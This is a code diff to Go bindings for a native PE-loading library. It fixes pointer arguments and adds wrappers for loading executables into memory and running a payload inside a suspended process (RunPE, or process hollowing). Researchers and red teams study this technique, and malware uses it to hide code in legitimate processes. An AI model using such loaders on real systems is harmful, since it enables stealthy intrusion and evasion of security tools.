@@ -73,7 +73,7 @@ func IsTargetCompatible(payloadBuf uintptr, payloadSize uint64, targetPath strin
 func CreateSuspendedProcess(path string, pi *syscall.ProcessInformation) bool {
 	ret, _, err := procCreateSuspendedProcess.Call(
 		uintptr(unsafe.Pointer(C.CString(path))),
-		uintptr(unsafe.Pointer(&pi)),
+		uintptr(unsafe.Pointer(pi)),
 	)
 	if ret == 0 {
 		log.Println("Error create_suspended_process: ", err.Error())
@@ -92,11 +92,57 @@ func RunPE2(
 	ret, _, err := procRunPE2.Call(
 		uintptr(loadedPE),
 		uintptr(payloadImageSize),
-		uintptr(unsafe.Pointer(&pi)),
+		uintptr(unsafe.Pointer(pi)),
 		uintptr(is32Flag),
 	)
 	if ret == 0 {
 		log.Println("Error _run_pe: ", err.Error())
 	}
 	return ret != 0
+}
+
+//FreePEBuffer func
+func FreePEBuffer(buffer uintptr, bufferSize uint64) bool {
+	ret, _, err := procFreePEBuffer.Call(
+		uintptr(buffer),
+		uintptr(bufferSize),
+	)
+	if ret == 0 {
+		log.Println("Error free_pe_buffer: ", err.Error())
+	}
+	return ret != 0
+}
+
+//LoadPEModule2 func
+func LoadPEModule2(dllRawData uintptr, rSize uint64, vSize *uint64, executable, relocate bool) uintptr {
+	var exFlag, relocFlag int
+	if executable {
+		exFlag = 1
+	}
+	if relocate {
+		relocFlag = 1
+	}
+	ret, _, err := procLoadPEModule2.Call(
+		dllRawData,
+		uintptr(rSize),
+		uintptr(unsafe.Pointer(vSize)),
+		uintptr(exFlag),
+		uintptr(relocFlag),
+	)
+	if ret == 0 {
+		log.Println("Error load_pe_module2: ", err.Error())
+	}
+	return ret
+}
+
+//LoadFile func
+func LoadFile(fileName string, readSize *uint64) uintptr {
+	ret, _, err := procLoadFile.Call(
+		uintptr(unsafe.Pointer(C.CString(fileName))),
+		uintptr(unsafe.Pointer(readSize)),
+	)
+	if ret == 0 {
+		log.Println("Error load_file: ", err.Error())
+	}
+	return ret
 }
